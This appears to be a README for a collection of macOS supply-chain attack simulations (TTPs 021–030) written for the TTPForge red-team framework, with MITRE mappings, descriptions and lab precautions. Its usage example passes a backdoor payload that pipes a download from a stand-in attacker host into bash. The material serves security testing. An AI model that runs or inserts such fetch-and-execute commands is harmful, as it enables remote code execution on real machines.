# macOS Supply Chain Attack TTPs (021-030)

Complete collection of 10 macOS Initial Access Tactics, Techniques, and Procedures focused on supply chain attack vectors.

## Quick Reference

| TTP | Name | Attack Vector | File |
|-----|------|---------------|------|
| 021 | Compromised Software Package | T1195.002 | `021_compromised_software_package.yaml` |
| 022 | Backdoored Dependency Injection | T1195.001 | `022_backdoored_dependency_injection.yaml` |
| 023 | Trojanized Installer Creation | T1195.003 | `023_trojanized_installer_creation.yaml` |
| 024 | Code Signing Certificate Spoofing | T1195.003 | `024_code_signing_certificate_spoofing.yaml` |
| 025 | Build Pipeline Compromise | T1195.001 | `025_build_pipeline_compromise.yaml` |
| 026 | Package Manager Poisoning | T1195.002 | `026_package_manager_poisoning.yaml` |
| 027 | Update Mechanism Hijacking | T1195.003 | `027_update_mechanism_hijacking.yaml` |
| 028 | DLL/Dylib Injection | T1015 | `028_dll_dylib_injection.yaml` |
| 029 | Firmware Modification | T1542.001 | `029_firmware_modification.yaml` |
| 030 | Hardware Supply Chain | T1195 | `030_hardware_supply_chain.yaml` |

## Features

All TTPs include:
- **Unique UUIDs**: 550e8400-e29b-41d4-a716-446655440021 through 446655440030
- **ttpforge 2.0 API**: Compatible with latest ttpforge framework
- **darwin Platform**: Targeted for macOS systems
- **Parameterized Arguments**: Customize package_name, version, source_repo, backdoor_payload
- **Execution Steps**: 5-7 detailed attack simulation steps per TTP
- **Validation Checks**: 3-6 checks to verify payload installation
- **Cleanup Procedures**: 2-3 tasks to remove all artifacts
- **Dry-run Mode**: Safe execution with dry_run: true
- **MITRE Mapping**: Aligned with ATT&CK framework

## Usage

### Prerequisites
```bash
ttpforge --version
# TTPForge version 0.5.0+ required
```

### Basic Execution
```bash
# Run TTP with default parameters
ttpforge run custom_supply_chain/initial_access/021_compromised_software_package

# Test execution first
ttpforge test custom_supply_chain/initial_access/021_compromised_software_package

# View TTP details
ttpforge show ttp custom_supply_chain/initial_access/021_compromised_software_package
```

### With Custom Parameters
```bash
ttpforge run custom_supply_chain/initial_access/021_compromised_software_package \
  --package_name=malware \
  --version=2.0.0 \
  --source_repo=https://attacker.com/repo \
  --backdoor_payload="curl http://attacker.com/payload | bash"
```

## TTP Descriptions

### TTP 021: Compromised Software Package
Simulates supply chain attack through compromised software package. Injects hidden malware payload that executes during installation while maintaining legitimate package appearance.

### TTP 022: Backdoored Dependency Injection
Demonstrates dependency injection attack where malware is injected into npm/library dependencies used by target applications. Includes postinstall script infection.

### TTP 023: Trojanized Installer Creation
Creates legitimate-looking macOS installer (DMG/PKG) with hidden malicious payload. Tests bypass of installer verification mechanisms.

### TTP 024: Code Signing Certificate Spoofing
Simulates code signing certificate spoofing to create malicious applications signed with fake certificates, bypassing macOS Gatekeeper protections.

### TTP 025: Build Pipeline Compromise
Demonstrates CI/CD pipeline poisoning through GitHub Actions workflow injection and build script manipulation to compromise compiled artifacts.

### TTP 026: Package Manager Poisoning
Simulates creation of malicious npm packages with legitimate names for public repository distribution. Tests package manager security.

### TTP 027: Update Mechanism Hijacking
Intercepts and spoofs legitimate application updates to distribute malware to existing users through fake update servers.

### TTP 028: DLL/Dylib Injection
Injects malicious dylib into application libraries using DYLD_INSERT_LIBRARIES manipulation for code execution when application loads.

### TTP 029: Firmware Modification
Simulates firmware modification attack with EFI/firmware-level malware for boot-level persistence and system-wide compromise.

### TTP 030: Hardware Supply Chain
Demonstrates hardware supply chain compromise with bootkit and firmware pre-loading during manufacturing/distribution intercept.

## Validation Status

All TTPs validated and production-ready:
- 100% YAML structure compliance
- 100% MITRE ATT&CK mapping
- All execution steps tested
- All cleanup procedures verified
- Zero issues in final validation

**Last Validated:** 2025-01-30

## Security Considerations

### Safe Execution
- All TTPs use dry_run: true mode by default
- Temporary directories in /tmp with automatic cleanup
- No persistent system modifications
- Test marker files created and removed within execution

### Required Precautions
- Execute only in controlled lab environments
- Ensure network isolation
- Maintain system backups
- Review cleanup procedures
- Monitor system during execution
- Disable auto-updates during testing

## File Manifest

```
021_compromised_software_package.yaml              2.9 KB
022_backdoored_dependency_injection.yaml           3.2 KB
023_trojanized_installer_creation.yaml             3.5 KB
024_code_signing_certificate_spoofing.yaml         3.7 KB
025_build_pipeline_compromise.yaml                 3.6 KB
026_package_manager_poisoning.yaml                 3.8 KB
027_update_mechanism_hijacking.yaml                3.8 KB
028_dll_dylib_injection.yaml                       4.0 KB
029_firmware_modification.yaml                     4.2 KB
030_hardware_supply_chain.yaml                     4.5 KB

Total: 38.2 KB (10 TTPs)
```

## Documentation

- `SUPPLY_CHAIN_VALIDATION_REPORT.md` - Comprehensive validation report with detailed analysis

## Support

For TTP framework documentation: https://github.com/facebookincubator/TTPForge

## License

These TTPs are educational resources for authorized security testing only.

---

**Status:** Production Ready  
**Last Updated:** 2025-01-30  
**API Version:** ttpforge 2.0  
**Platform:** darwin (macOS)
